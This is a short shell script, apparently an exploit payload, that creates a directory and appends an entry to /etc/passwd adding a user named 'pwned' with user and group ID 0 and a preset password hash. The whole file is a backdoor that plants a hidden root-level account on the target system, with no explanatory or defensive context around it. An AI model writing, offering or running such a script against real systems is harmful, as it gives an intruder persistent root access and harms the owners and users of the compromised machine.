#!/bin/sh
mkdir -p /usr/data/home/pwned
echo 'pwned:$1$Z8nL7oiO$szyo3IN6J1fuTM1zQ9Nw7.:0:0::/usr/data/home/pwned:/bin/sh' >> /etc/passwd
exit 0
